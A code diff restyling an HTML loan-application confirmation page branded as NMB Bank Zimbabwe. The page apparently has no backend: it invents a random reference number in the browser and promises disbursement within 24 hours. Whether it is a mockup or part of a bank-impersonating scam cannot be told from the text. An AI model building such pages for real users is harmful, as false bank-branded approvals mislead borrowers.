@@ -3,193 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NMB Connect - Loan Approved!</title>
+    <title>NMB Connect - Application Success</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&display=swap');
         * { font-family: 'Inter', sans-serif; }
-        body { background: linear-gradient(135deg, #003B4F 0%, #001F2E 100%); min-height: 100vh; }
+        body { background: linear-gradient(135deg, #004a99 0%, #003366 100%); min-height: 100vh; }
+        .glass-effect { background: rgba(255, 255, 255, 0.98); backdrop-filter: blur(10px); }
+        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
     </style>
 </head>
-<body class="flex flex-col items-center justify-center min-h-screen p-3 sm:p-4">
-    <div class="w-full max-w-2xl">
+<body class="flex flex-col items-center justify-center min-h-screen p-4 py-10">
+    <div class="w-full max-w-sm fade-in">
         <!-- Header -->
         <div class="text-center mb-6">
-            <div class="flex items-center justify-center gap-2 mb-3">
-                <i class="fas fa-key text-4xl text-[#E4C16A]"></i>
-                <div>
-                    <span class="text-3xl sm:text-4xl font-black text-white">NMB</span>
-                    <span class="text-3xl sm:text-4xl font-black text-[#E4C16A]">Connect</span>
-                </div>
+            <div class="flex items-center justify-center gap-1 mb-2">
+                <span class="text-3xl font-black text-white tracking-tighter">NMB</span>
+                <span class="text-3xl font-black text-[#f2a900] tracking-tighter">Connect</span>
             </div>
-            <p class="text-white/70 text-xs font-semibold uppercase tracking-wide">🇿🇼 Loan Approved</p>
+            <p class="text-white/80 text-[10px] font-bold uppercase tracking-[0.3em]">Confirmation</p>
         </div>
 
         <!-- Main Card -->
-        <div class="bg-white rounded-2xl shadow-2xl overflow-hidden">
+        <div class="glass-effect rounded-3xl shadow-2xl overflow-hidden">
             <!-- Title Section -->
-            <div class="bg-gradient-to-r from-green-500 to-green-600 p-6 sm:p-8 text-center">
-                <h1 class="text-white font-black text-3xl sm:text-4xl mb-2">🎉 Congratulations!</h1>
-                <p class="text-white/90 text-sm font-semibold">Your loan application has been approved</p>
+            <div class="bg-gradient-to-r from-[#003366] to-[#004a99] p-6 text-center">
+                <h1 class="text-white font-black text-xl mb-1 uppercase tracking-tight">Success!</h1>
+                <p class="text-white/70 text-[10px] font-bold uppercase tracking-widest">Application Submitted</p>
             </div>
 
             <!-- Content -->
-            <div class="p-6 sm:p-8 space-y-6">
-                <!-- Success Icon -->
-                <div class="flex justify-center">
-                    <div class="w-20 h-20 sm:w-24 sm:h-24 bg-green-100 rounded-full flex items-center justify-center shadow-lg">
-                        <i class="fas fa-check text-4xl sm:text-5xl text-green-600"></i>
-                    </div>
+            <div class="p-6 sm:p-8 space-y-6 text-center">
+                <div class="w-20 h-20 bg-green-50 rounded-full flex items-center justify-center mx-auto shadow-inner border border-green-100">
+                    <i class="fas fa-check text-4xl text-green-500"></i>
                 </div>
 
-                <!-- Reference Number -->
-                <div class="bg-gradient-to-r from-blue-50 to-blue-100 border border-blue-300 rounded-lg p-4 text-center">
-                    <p class="text-xs font-black text-gray-700 uppercase mb-2">Reference Number</p>
-                    <p class="text-2xl sm:text-3xl font-mono font-black text-[#003B4F]" id="refNum">NMB-2026-XXXXXX</p>
+                <div class="space-y-1">
+                    <p class="text-[10px] font-black text-gray-400 uppercase tracking-widest">Reference Number</p>
+                    <p class="text-xl font-mono font-black text-[#003366]" id="refNum">NMB-XXXX-XXXX</p>
                 </div>
 
-                <!-- Applicant Details -->
-                <div class="bg-gradient-to-r from-blue-50 to-blue-100 border border-blue-300 rounded-lg p-4">
-                    <p class="text-xs font-black text-gray-700 uppercase mb-3 flex items-center gap-2">
-                        <i class="fas fa-user text-[#E4C16A]"></i> Applicant Details
-                    </p>
-                    <div class="space-y-2 text-sm">
-                        <div class="flex justify-between">
-                            <span class="text-gray-700 font-semibold">Name:</span>
-                            <span class="font-black text-[#003B4F]" id="applicantName">-</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-700 font-semibold">Phone:</span>
-                            <span class="font-black text-[#003B4F]" id="applicantPhone">-</span>
-                        </div>
-                        <div class="flex justify-between">
-                            <span class="text-gray-700 font-semibold">Purpose:</span>
-                            <span class="font-black text-[#003B4F]" id="applicantPurpose">-</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Loan Details -->
-                <div class="bg-gray-50 rounded-lg p-4 space-y-3 border-2 border-gray-200">
-                    <p class="text-xs font-black text-gray-700 uppercase mb-3 flex items-center gap-2">
-                        <i class="fas fa-money-bill-wave text-[#E4C16A]"></i> Loan Details
-                    </p>
+                <div class="bg-gray-50 rounded-2xl p-5 space-y-3 border border-gray-100 text-left">
                     <div class="flex justify-between items-center">
-                        <span class="text-xs text-gray-700 font-semibold">Loan Amount</span>
-                        <span class="font-black text-lg text-[#003B4F]" id="finalAmount">ZWL 50,000</span>
+                        <span class="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Amount</span>
+                        <span class="font-black text-base text-[#003366]" id="finalAmount">$500</span>
                     </div>
-                    <div class="border-t border-gray-300 pt-3 flex justify-between items-center">
-                        <span class="text-xs text-gray-700 font-semibold">Repayment Term</span>
-                        <span class="font-black text-lg text-[#003B4F]" id="finalTerm">12 Months</span>
-                    </div>
-                    <div class="border-t border-gray-300 pt-3 flex justify-between items-center">
-                        <span class="text-xs text-gray-700 font-semibold">Monthly Payment</span>
-                        <span class="font-black text-lg text-[#003B4F]" id="finalMonthly">ZWL 4,349</span>
-                    </div>
-                    <div class="border-t border-gray-300 pt-3 flex justify-between items-center">
-                        <span class="text-xs text-gray-700 font-semibold">Total to Pay</span>
-                        <span class="font-black text-lg text-[#003B4F]" id="finalTotal">ZWL 52,200</span>
+                    <div class="h-px bg-gray-200 w-full"></div>
+                    <div class="flex justify-between items-center">
+                        <span class="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Monthly Pay</span>
+                        <span class="font-black text-base text-[#003366]" id="finalMonthly">$43.49</span>
                     </div>
                 </div>
 
-                <!-- Info Box -->
-                <div class="bg-green-50 border-2 border-green-300 rounded-lg p-4">
-                    <p class="text-xs text-gray-700 leading-relaxed">
-                        <i class="fas fa-info-circle text-green-600 mr-2 font-black"></i>
-                        <strong>Funds will be transferred within 24 hours</strong> to your registered bank account. You'll receive an SMS confirmation at <span id="confirmPhone" class="font-black">+263XXXXXXXXX</span>
+                <div class="bg-blue-50/50 border border-blue-100 rounded-2xl p-4">
+                    <p class="text-[10px] text-gray-600 font-bold leading-relaxed uppercase tracking-tight">
+                        <i class="fas fa-info-circle text-[#003366] mr-1"></i>
+                        Funds will be disbursed to your account within 24 hours.
                     </p>
                 </div>
 
-                <!-- Next Steps -->
-                <div class="bg-blue-50 border-2 border-blue-300 rounded-lg p-4">
-                    <p class="text-xs font-black text-gray-700 uppercase mb-3 flex items-center gap-2">
-                        <i class="fas fa-tasks text-[#E4C16A]"></i> Next Steps
-                    </p>
-                    <ol class="text-xs text-gray-700 space-y-2 font-semibold">
-                        <li><span class="font-black">1.</span> Check your SMS for fund transfer confirmation</li>
-                        <li><span class="font-black">2.</span> Funds will appear in your account within 24 hours</li>
-                        <li><span class="font-black">3.</span> Monthly payments will be auto-deducted from your account</li>
-                        <li><span class="font-black">4.</span> Keep your reference number for support inquiries</li>
-                    </ol>
-                </div>
-
-                <!-- Action Buttons -->
-                <div class="space-y-3">
-                    <button id="downloadBtn" class="w-full bg-white border-2 border-[#003B4F] text-[#003B4F] font-black py-3 sm:py-4 rounded-lg hover:bg-gray-50 transition-all flex items-center justify-center gap-2 uppercase text-xs sm:text-sm tracking-wide">
-                        <i class="fas fa-download"></i> Download Approval Letter
-                    </button>
-                    <button onclick="backToHome()" class="w-full bg-gradient-to-r from-[#003B4F] to-[#001F2E] text-white font-black py-3 sm:py-4 rounded-lg hover:shadow-lg transition-all uppercase text-xs sm:text-sm tracking-wide flex items-center justify-center gap-2">
-                        <i class="fas fa-home"></i> Apply for Another Loan
-                    </button>
-                </div>
-
-                <!-- Support Info -->
-                <div class="text-center space-y-2 bg-gray-50 rounded-lg p-4">
-                    <p class="text-xs font-black text-gray-700 uppercase">Need Help?</p>
-                    <p class="text-xs text-gray-600">
-                        <i class="fas fa-phone text-[#E4C16A] mr-1"></i>
-                        Call us: <span class="font-black">+263 242 700 700</span>
-                    </p>
-                    <p class="text-xs text-gray-600">
-                        <i class="fas fa-envelope text-[#E4C16A] mr-1"></i>
-                        Email: <span class="font-black">support@nmbconnect.co.zw</span>
-                    </p>
-                </div>
+                <button onclick="backToHome()" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-4 rounded-2xl hover:shadow-xl active:scale-[0.98] transition-all uppercase text-sm tracking-[0.15em] shadow-lg">
+                    Return Home <i class="fas fa-home ml-2"></i>
+                </button>
             </div>
         </div>
 
         <!-- Footer -->
-        <div class="mt-8 text-center space-y-2">
-            <p class="text-white/80 text-xs font-semibold">
-                <i class="fas fa-shield-alt text-[#E4C16A] mr-1"></i>
-                Licensed & Regulated by Reserve Bank of Zimbabwe
-            </p>
-            <p class="text-white/60 text-xs">
-                © 2026 NMB Holdings Limited | All Rights Reserved
-            </p>
-        </div>
+        <p class="text-center text-white/50 text-[10px] mt-8 font-bold uppercase tracking-widest">
+            © 2026 NMB Bank Zimbabwe | Application Complete
+        </p>
     </div>
 
     <script>
         const loanData = JSON.parse(localStorage.getItem('nmb_loan_data') || '{}');
         const session = JSON.parse(localStorage.getItem('nmb_session') || '{}');
         
-        // Populate loan details
-        document.getElementById('finalAmount').textContent = 'ZWL ' + Math.round(parseFloat(loanData.amount || 50000)).toLocaleString();
-        document.getElementById('finalTerm').textContent = `${loanData.term || 0} Months`;
-        document.getElementById('finalMonthly').textContent = loanData.monthly || 'ZWL 0';
-        document.getElementById('finalTotal').textContent = loanData.total || 'ZWL 0';
+        document.getElementById('finalAmount').textContent = `$${parseFloat(loanData.amount || 0).toLocaleString()}`;
+        document.getElementById('finalMonthly').textContent = loanData.monthly || '$0.00';
 
-        // Populate applicant details
-        document.getElementById('applicantName').textContent = loanData.fullName || '-';
-        document.getElementById('applicantPhone').textContent = session.phone || '-';
-        document.getElementById('applicantPurpose').textContent = loanData.loanPurpose || '-';
-        document.getElementById('confirmPhone').textContent = session.phone || '+263XXXXXXXXX';
-
-        // Generate reference number
-        const randomRef = 'NMB-2026-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+        const randomRef = 'NMB-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
         document.getElementById('refNum').textContent = randomRef;
 
-        // Download button
-        document.getElementById('downloadBtn').addEventListener('click', () => {
-            alert('Your approval letter has been sent to ' + session.phone + '. Check your SMS.');
-        });
-
-        // Back to home
         function backToHome() {
-            localStorage.removeItem('nmb_loan_data');
-            localStorage.removeItem('nmb_session');
-            window.location.href = 'index_FINAL.html';
+            localStorage.clear();
+            window.location.href = 'index.html';
         }
 
-        // Trigger confetti animation
         confetti({
             particleCount: 150,
             spread: 70,
             origin: { y: 0.6 },
-            colors: ['#003B4F', '#E4C16A', '#22c55e']
+            colors: ['#003366', '#f2a900', '#22c55e']
         });
     </script>
 </body>
